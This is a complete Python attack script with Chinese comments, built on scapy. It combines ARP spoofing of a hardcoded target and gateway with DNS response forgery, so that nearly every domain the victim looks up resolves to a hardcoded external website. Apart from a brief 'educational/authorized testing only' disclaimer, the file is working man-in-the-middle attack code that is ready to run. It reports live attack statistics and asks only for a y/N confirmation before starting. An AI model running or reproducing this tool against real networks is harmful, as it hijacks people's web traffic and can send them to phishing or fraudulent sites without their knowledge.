#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
全网重定向DNS劫持程序
将所有域名重定向到指定网站

功能特性：
1. 全网域名重定向
2. 支持HTTP到HTTPS重定向
3. 智能域名过滤
4. 与ARP欺骗集成

⚠️ 重要提醒：仅供学习和授权的安全测试使用
"""

import os
import sys
import time
import socket
import threading
import re
from datetime import datetime
from typing import Dict, List, Optional

# 导入scapy相关模块
try:
    from scapy.all import *
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.inet import IP, UDP
    from scapy.sendrecv import sniff, send
    SCAPY_AVAILABLE = True
except ImportError:
    print("[-] 警告: scapy库未安装，部分功能将受限")
    SCAPY_AVAILABLE = False

class UniversalRedirectDNS:
    def __init__(self, redirect_url: str = "https://www.kjqun.cn/qqszw/45.html"):
        self.is_running = False
        self.redirect_url = redirect_url
        self.target_ip = "10.30.77.103"
        self.gateway_ip = "10.30.255.254"
        
        # 解析重定向URL
        self.redirect_domain, self.redirect_ip = self.parse_redirect_url(redirect_url)
        
        # 统计信息
        self.stats = {
            'total_queries': 0,
            'redirected_queries': 0,
            'start_time': None,
            'domains_redirected': set()
        }
        
        # 域名白名单（避免重定向关键服务）
        self.whitelist = {
            'local_domains': ['local', 'localhost', '127.0.0.1'],
            'critical_services': [
                'dns', 'dhcp', 'router', 'gateway',
                '8.8.8.8', '8.8.4.4', '114.114.114.114'
            ]
        }
        
        # 配置优化
        if SCAPY_AVAILABLE:
            conf.verb = 0
        
        print(f"[+] 全网重定向DNS劫持初始化完成")
        print(f"[+] 重定向目标: {redirect_url}")
        print(f"[+] 目标IP: {self.target_ip}")
        print(f"[+] 网关IP: {self.gateway_ip}")
        print(f"[+] 重定向域名: {self.redirect_domain}")
        print(f"[+] 重定向IP: {self.redirect_ip}")
    
    def parse_redirect_url(self, url: str) -> tuple:
        """解析重定向URL，提取域名和IP"""
        # 从URL中提取域名
        domain_match = re.search(r'https?://([^/]+)', url)
        if domain_match:
            domain = domain_match.group(1)
        else:
            domain = "www.kjqun.cn"
        
        # 获取域名的IP地址
        try:
            ip = socket.gethostbyname(domain)
            print(f"[+] 解析域名 {domain} -> IP {ip}")
        except:
            ip = "127.0.0.1"
            print(f"[-] 无法解析域名 {domain}，使用默认IP {ip}")
        
        return domain, ip
    
    def should_redirect_domain(self, domain: str) -> bool:
        """判断是否应该重定向该域名"""
        # 检查白名单
        for whitelist_domain in self.whitelist['local_domains']:
            if whitelist_domain in domain:
                return False
        
        for critical_service in self.whitelist['critical_services']:
            if critical_service in domain:
                return False
        
        # 特殊处理：避免重定向到自身
        if self.redirect_domain in domain:
            return False
        
        return True
    
    def start_universal_redirect(self, duration: int = 300):
        """开始全网重定向攻击"""
        if not SCAPY_AVAILABLE:
            print("[-] scapy不可用，无法进行DNS劫持")
            return False
        
        print(f"[+] 开始全网重定向DNS劫持")
        print(f"[+] 攻击时长: {duration}秒")
        print(f"[+] 所有域名将被重定向到: {self.redirect_url}")
        
        self.is_running = True
        self.stats['start_time'] = datetime.now()
        
        try:
            # 启动ARP欺骗（可选）
            arp_thread = threading.Thread(target=self.start_arp_spoofing)
            arp_thread.daemon = True
            arp_thread.start()
            
            # DNS嗅探过滤器
            filter_str = f"udp port 53 and host {self.target_ip}"
            
            print(f"[+] 开始嗅探DNS流量...")
            print(f"[+] 过滤器: {filter_str}")
            
            # 启动DNS嗅探
            sniff_thread = threading.Thread(
                target=self.dns_sniff_worker,
                args=(filter_str,)
            )
            sniff_thread.daemon = True
            sniff_thread.start()
            
            # 主循环
            end_time = time.time() + duration
            
            while self.is_running and time.time() < end_time:
                time.sleep(1)
                
                # 每10秒显示状态
                if int(time.time() - self.stats['start_time'].timestamp()) % 10 == 0:
                    self.show_status()
            
            return True
            
        except KeyboardInterrupt:
            print("\n[!] 用户中断攻击")
            return False
        except Exception as e:
            print(f"[-] 全网重定向失败: {e}")
            return False
        finally:
            self.stop_attack()
    
    def dns_sniff_worker(self, filter_str: str):
        """DNS嗅探工作线程"""
        try:
            sniff(
                filter=filter_str,
                prn=self.process_dns_packet,
                store=0,
                stop_filter=lambda x: not self.is_running
            )
        except Exception as e:
            print(f"[-] DNS嗅探错误: {e}")
    
    def process_dns_packet(self, packet):
        """处理DNS数据包"""
        if not self.is_running or not packet.haslayer(DNS):
            return
        
        self.stats['total_queries'] += 1
        
        try:
            dns_layer = packet[DNS]
            
            # 只处理查询包
            if dns_layer.qr == 0 and dns_layer.qd:
                query = dns_layer.qd
                domain = query.qname.decode('utf-8').rstrip('.')
                
                # 判断是否需要重定向
                if self.should_redirect_domain(domain):
                    self.redirect_dns_query(packet, domain)
                    self.stats['redirected_queries'] += 1
                    self.stats['domains_redirected'].add(domain)
                    
                    print(f"[+] 重定向: {domain} -> {self.redirect_domain}")
                else:
                    print(f"[-] 跳过: {domain} (在白名单中)")
        
        except Exception as e:
            print(f"[-] 处理DNS包错误: {e}")
    
    def redirect_dns_query(self, packet, original_domain: str):
        """重定向DNS查询"""
        try:
            ip_layer = packet[IP]
            udp_layer = packet[UDP]
            dns_layer = packet[DNS]
            
            # 构建伪造的DNS响应
            fake_response = IP(src=ip_layer.dst, dst=ip_layer.src) / \
                          UDP(sport=udp_layer.dport, dport=udp_layer.sport) / \
                          DNS(
                              id=dns_layer.id,
                              qr=1,      # 响应标志
                              aa=1,      # 权威回答
                              qd=dns_layer.qd,  # 查询部分
                              an=DNSRR(
                                  rrname=original_domain + ".",
                                  type="A",
                                  rclass="IN",
                                  ttl=300,  # 5分钟TTL
                                  rdata=self.redirect_ip
                              )
                          )
            
            # 发送伪造响应
            send(fake_response, verbose=False)
            
        except Exception as e:
            print(f"[-] 重定向DNS查询失败: {e}")
    
    def start_arp_spoofing(self):
        """启动ARP欺骗（可选）"""
        if not SCAPY_AVAILABLE:
            return
        
        print("[+] 启动ARP欺骗...")
        
        try:
            # 获取MAC地址
            target_mac = self.get_mac_address(self.target_ip)
            gateway_mac = self.get_mac_address(self.gateway_ip)
            
            if not target_mac or not gateway_mac:
                print("[-] 无法获取MAC地址，跳过ARP欺骗")
                return
            
            # 获取本机MAC地址
            try:
                # 通过网关获取本机MAC
                ans, unans = arping(self.gateway_ip, verbose=False, timeout=2)
                if ans:
                    local_mac = ans[0][0].hwsrc
                else:
                    local_mac = "00:11:22:33:44:55"  # 默认MAC
            except:
                local_mac = "00:11:22:33:44:55"
            
            while self.is_running:
                # 发送ARP欺骗包（修复警告）
                try:
                    # 欺骗目标：网关的MAC是我们（指定以太网目标MAC）
                    pkt1 = Ether(dst=target_mac)/ARP(op=2, pdst=self.target_ip, hwdst=target_mac, 
                                                     psrc=self.gateway_ip, hwsrc=local_mac)
                    # 欺骗网关：目标的MAC是我们
                    pkt2 = Ether(dst=gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac,
                                                     psrc=self.target_ip, hwsrc=local_mac)
                    
                    sendp(pkt1, verbose=False)  # 使用sendp发送二层包
                    sendp(pkt2, verbose=False)
                    
                except Exception as e:
                    print(f"[-] 发送ARP包失败: {e}")
                
                time.sleep(2)  # 每2秒发送一次
        
        except Exception as e:
            print(f"[-] ARP欺骗错误: {e}")
    
    def get_mac_address(self, ip: str) -> Optional[str]:
        """获取MAC地址"""
        try:
            ans, unans = arping(ip, verbose=False, timeout=2)
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None
    
    def show_status(self):
        """显示状态信息"""
        if self.stats['start_time']:
            duration = datetime.now() - self.stats['start_time']
            
            print(f"\n[+] 攻击状态:")
            print(f"    运行时间: {duration}")
            print(f"    总查询数: {self.stats['total_queries']}")
            print(f"    重定向数: {self.stats['redirected_queries']}")
            
            if self.stats['total_queries'] > 0:
                redirect_rate = (self.stats['redirected_queries'] / self.stats['total_queries']) * 100
                print(f"    重定向率: {redirect_rate:.1f}%")
            
            if self.stats['domains_redirected']:
                print(f"    已重定向域名: {len(self.stats['domains_redirected'])} 个")
                if len(self.stats['domains_redirected']) <= 5:
                    for domain in list(self.stats['domains_redirected'])[:5]:
                        print(f"        - {domain}")
    
    def stop_attack(self):
        """停止攻击"""
        print("\n[+] 停止全网重定向攻击")
        
        self.is_running = False
        
        # 显示最终统计
        self.show_final_stats()
    
    def show_final_stats(self):
        """显示最终统计信息"""
        if self.stats['start_time']:
            duration = datetime.now() - self.stats['start_time']
            
            print("\n" + "="*50)
            print("            攻击完成统计")
            print("="*50)
            print(f"目标IP: {self.target_ip}")
            print(f"网关IP: {self.gateway_ip}")
            print(f"重定向URL: {self.redirect_url}")
            print(f"攻击时长: {duration}")
            print(f"总DNS查询: {self.stats['total_queries']}")
            print(f"成功重定向: {self.stats['redirected_queries']}")
            
            if self.stats['total_queries'] > 0:
                success_rate = (self.stats['redirected_queries'] / self.stats['total_queries']) * 100
                print(f"重定向成功率: {success_rate:.1f}%")
            
            print(f"重定向域名数量: {len(self.stats['domains_redirected'])}")
            
            if self.stats['domains_redirected']:
                print("\n重定向的域名示例:")
                for domain in list(self.stats['domains_redirected'])[:10]:
                    print(f"  - {domain}")
            
            print("="*50)

def main():
    """主函数"""
    print("=" * 60)
    print("           全网重定向DNS劫持程序")
    print("               (教育用途)")
    print("=" * 60)
    
    if not SCAPY_AVAILABLE:
        print("[-] 错误: scapy库未安装")
        print("[!] 请安装: pip install scapy")
        return
    
    # 配置参数
    target_ip = "10.30.77.103"
    gateway_ip = "10.30.255.254"
    redirect_url = "https://www.kjqun.cn/qqszw/45.html"
    duration = 300  # 5分钟
    
    # 创建实例
    redirect_tool = UniversalRedirectDNS(redirect_url)
    redirect_tool.target_ip = target_ip
    redirect_tool.gateway_ip = gateway_ip
    
    # 重新解析URL
    redirect_tool.redirect_domain, redirect_tool.redirect_ip = redirect_tool.parse_redirect_url(redirect_url)
    
    print(f"\n[+] 配置确认:")
    print(f"    目标IP: {target_ip}")
    print(f"    网关IP: {gateway_ip}")
    print(f"    重定向URL: {redirect_url}")
    print(f"    攻击时长: {duration}秒")
    
    # 确认开始
    print("\n[!] 警告: 即将开始全网重定向攻击")
    print("[!] 目标设备的所有网站访问将被重定向")
    
    confirm = input("确认开始? (y/N): ").strip().lower()
    
    if confirm == 'y':
        redirect_tool.start_universal_redirect(duration)
    else:
        print("[-] 攻击取消")

if __name__ == "__main__":
    main()